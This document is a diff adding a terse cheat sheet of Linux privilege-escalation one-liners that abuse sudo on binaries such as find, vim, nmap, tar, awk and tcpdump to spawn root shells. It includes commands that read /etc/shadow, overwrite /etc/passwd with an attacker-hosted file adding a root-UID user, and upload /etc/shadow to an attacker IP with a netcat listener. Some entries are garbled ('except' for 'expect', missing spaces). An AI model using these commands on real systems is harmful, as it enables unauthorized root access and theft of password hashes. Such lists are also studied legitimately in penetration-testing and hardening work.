@@ -1,0 +1,56 @@
+- Using zip command
+   sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
+- Using tar command
+  sudo tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash
+- Using strace command
+   sudo strace -o/dev/null /bin/bash
+- Using tcpdump command
+   echo $’id\ncat /etc/shadow’ > /tmp/.shell
+   chmod +x /tmp/.shell
+    sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell-Z root
+- Using scp command
+    sudo scp -S /path/yourscript x y
+- Using except command
+    sudo except spawn sh then sh
+- Using nano command
+    sudo nano -S /bin/bash # type your command and hit CTRL+T 
+- Using git command
+   sudo git help status
+   !/bin/bash
+   # Using gdb/ftp command
+   sudo ftp
+   !/bin/sh
+- Using Find Command
+   sudo find /etc/passwd -exec /bin/sh \;
+- or
+   sudo find /bin -name nano -exec /bin/sh \;
+- Using Vim Command
+   sudo vim -c '!sh'
+- Using Nmap Command (Old way)
+   sudo nmap --interactive
+   nmap> !sh
+Sh-4.1
+- Using Nmap Command (Latest Way without –interactive)
+  echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
+- Using Man Command
+  sudo man man # after that press !sh and hit enter
+- Using Less/More Command
+  sudo less /etc/hosts
+  sudo more /etc/hosts  [ after that press !sh and hit enter]
+- Using awk Command
+  sudo awk 'BEGIN {system("/bin/sh")}'
+- Using nano Command
+  sudo nano  /etc/passwd [now switch user password is : test]
+  su touhid
+- Using wget Command
+- [On Attaker Side]
+[First Copy Target’s /etc/passwd file to attacker machine. Modify file and add a user in passwd file which is saved in the previous step to the attacker machine. Append this line only ]
+=> touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash
+-Host that passwd file to using any web server.
+-[ On Victim Side.]
+   sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd
+[Now switch user password is : test]
+  su touhid
+  sudo wget --post-file=/etc/shadow 192.168.56.1:8080 [Setup Listener on attacker : nc –lvp 8080]
+-Using apache Command
+ sudo apache2 -f /etc/shadow
